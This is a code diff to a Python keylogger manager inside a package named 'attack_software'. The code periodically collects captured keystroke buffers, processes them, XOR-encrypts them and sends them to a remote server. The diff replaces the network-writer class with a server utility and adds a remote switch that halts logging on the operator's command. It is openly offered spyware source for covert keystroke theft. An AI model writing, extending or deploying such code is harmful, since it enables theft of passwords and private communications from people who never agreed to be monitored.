@@ -1,5 +1,5 @@
 import time
-from NetworkWriter import WriterNetwork
+from server_utils import ServerUtils
 from keyboard_log_processor import KeyboardLogProcessor
 from attack_software.config.config import Flush_interval
 from attack_software.src.xor_encryption import XOREncryption
@@ -15,7 +15,7 @@ class KeyloggerManager:
         self.running = False
         self.server_url = server_url
         self.last_buffer_send = time.time()
-        self.writerNetwork = WriterNetwork()
+        self.server_utils = ServerUtils()
         self.dictWriter = KeyboardLogProcessor()
         self.encryption = XOREncryption()
 
@@ -25,11 +25,13 @@ class KeyloggerManager:
             current_time = time.time()
             # Check if 60 seconds have passed since last send
             if current_time - self.last_buffer_send >= Flush_interval :
+                if not self.server_utils.isKeylogActive():
+                    self.service.stop_logging()
                 buffer_data = self.service.get_buffer_data()
                 if buffer_data:
                     key_log = self.dictWriter.process_keylog(buffer_data)
                     encrypted_logs = self.encryption.encrypt(str(key_log))
-                    self.writerNetwork.send_data(encrypted_logs)
+                    self.server_utils.send_data(encrypted_logs)
                 self.last_buffer_send = current_time
             time.sleep(1)  # Check every second efficiently
 
